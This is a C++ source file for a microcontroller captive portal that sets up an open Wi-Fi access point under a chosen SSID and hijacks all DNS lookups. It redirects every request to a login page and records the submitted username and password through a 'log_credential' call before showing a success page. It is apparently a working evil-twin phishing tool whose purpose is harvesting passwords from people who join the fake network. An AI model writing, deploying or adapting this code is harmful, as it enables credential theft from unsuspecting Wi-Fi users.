#include "captive_portal.h"
#include <WiFi.h>
#include "logger.h"
#include "portal_html.h"

CaptivePortal::CaptivePortal() : server(80) {}

void CaptivePortal::begin(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    IPAddress apIP = WiFi.softAPIP();
    Logger::log("AP Started. SSID: " + String(ssid));
    Logger::log("AP IP: " + apIP.toString());

    dnsServer.start(DNS_PORT, "*", apIP);
    
    setupRoutes();
    server.begin();
    running = true;
}

void CaptivePortal::update() {
    if (running) {
        dnsServer.processNextRequest();
    }
}

void CaptivePortal::stop() {
    server.end();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    running = false;
}

void CaptivePortal::setupRoutes() {
    // Captive Portal Detection
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });
    server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    // Main Portal Page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send(200, "text/html", login_html);
    });

    // Handle Login
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        String user = "";
        String pass = "";
        if (request->hasParam("user", true)) user = request->getParam("user", true)->value();
        if (request->hasParam("pass", true)) pass = request->getParam("pass", true)->value();
        
        Logger::log_credential(user, pass);
        
        request->send(200, "text/html", success_html);
    });

    // 404 Redirect to Portal
    server.onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/");
    });
}
